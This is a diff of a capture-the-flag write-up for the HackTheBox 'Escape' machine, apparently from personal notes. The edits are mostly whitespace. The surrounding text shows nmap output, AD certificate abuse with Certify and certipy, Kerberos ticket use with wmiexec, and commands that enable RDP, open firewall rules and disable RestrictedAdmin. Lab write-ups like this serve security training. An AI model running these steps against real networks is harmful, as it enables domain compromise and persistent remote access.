@@ -42,7 +42,6 @@ sudo $(which autorecon) -vv sequel.htb
 ```bash
 ┌──(kali㉿kali)-[~/…/Escape/results/sequel.htb/scans]
 └─$ cat _full_tcp_nmap.txt
-
 # Nmap 7.94 scan initiated Sun Jun 25 03:01:40 2023 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/kali/htb/Escape/results/sequel.htb/scans/_full_tcp_nmap.txt -oX /home/kali/htb/Escape/results/sequel.htb/scans/xml/_full_tcp_nmap.xml sequel.htb
 Nmap scan report for sequel.htb (10.10.11.202)
 Host is up, received user-set (0.057s latency).
@@ -191,7 +190,6 @@ HOP RTT      ADDRESS
 
 Read data files from: /usr/bin/../share/nmap
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-
 # Nmap done at Sun Jun 25 03:05:00 2023 -- 1 IP address (1 host up) scanned in 199.51 seconds
 ```
 
@@ -591,6 +589,7 @@ certipy auth -pfx administrator.pfx
 ```
 
 > **Fix `Clock skew too great`**
+> 
 > Methods to sync time with DC
 > 1. `sudo ntpdate sequel.htb`
 > 2. `faketime $TIME_STRING zsh`
@@ -605,7 +604,6 @@ I had issue using **ntpdate**, date will auto reset after 5 seconds, so use **fa
 
 ┌──(kali㉿kali)-[~/htb/Escape]
 └─$ faketime '2023-06-26 23:58:21.598013' zsh
-
 # or faketime -f '+28799.931571' zsh
 
 ┌──(kali㉿kali)-[~/htb/Escape]
@@ -655,10 +653,8 @@ Invoke-Certify request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthenticati
 ![](/assets/obsidian/69d4a1b262e64e024b70107348388865.png)
 
 ```bash
-
 # Write the cert recieved to kali
 vi cert.pem
-
 
 # Generate PFX, Just hit enter when prompting for password
 openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
@@ -823,30 +819,23 @@ Related - [[Windows Privilege Escalation#Access Machine#xFreeRDP]]
 Preparations (*MUST DO*) to enable RDP and bypass restrictions
 
 ```bash
-
 # CMD 
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
-
 
 # Powershell
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
 Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
 
-
 # Optional
 net localgroup "Remote Desktop Users" Administrator /add
-
 
 # Reruling firewall
 netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
 netsh advfirewall firewall add rule name="allow RemoteDesktop" dir=in protocol=TCP localport=3389 action=allow
 
-
 # Fix "account restrictions are preventing this user from signing in" by enabling Restricted Admin mode
-
 ## PowerShell Way
 New-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Lsa' -Name 'DisableRestrictedAdmin' -Value 0 -PropertyType DWORD
-
 ## Cmd Way
 reg add HKLM\system\currentcontrolset\control\lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
 ```
@@ -968,7 +957,6 @@ ticketConverter.py ticket.kirbi ticket.ccache
 ```bash
 ntpdate -q sequel.htb
 
-
 # Keep up with DC's time
 faketime -f '+28833.584347' wmiexec.py dc.sequel.htb -k
 ```
@@ -996,7 +984,6 @@ Use **klist** to confirm that the ticket is in memory
 Current LogonId is 0:0x752bec
 
 Cached Tickets: (1)
-
 
 #0>     Client: administrator @ SEQUEL.HTB
         Server: krbtgt/sequel.htb @ SEQUEL.HTB
